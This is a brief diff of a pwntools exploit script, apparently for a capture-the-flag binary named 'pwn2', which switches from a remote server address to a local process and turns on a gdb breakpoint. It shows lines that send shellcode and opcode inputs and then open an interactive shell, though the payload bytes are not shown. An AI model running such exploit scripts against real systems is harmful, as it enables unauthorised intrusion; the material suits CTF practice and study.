@@ -2,8 +2,8 @@ from pwn import *
 
 context(log_level="debug")
 
-# p = process("./pwn2")
-p = remote("106.75.37.31",23333)
+p = process("./pwn2")
+# p = remote("106.75.37.31",23333)
 
 p.recvuntil("ight!\n\n")
 
@@ -28,7 +28,7 @@ p.sendline(shellcode)
 p.sendline(op_mov_l)
 p.sendline(op_add_mv)
 
-# gdb.attach(p,"b*0x400776\nc")
+gdb.attach(p,"b*0x400776\nc")
 p.sendline(op_exit)
 p.interactive()
 
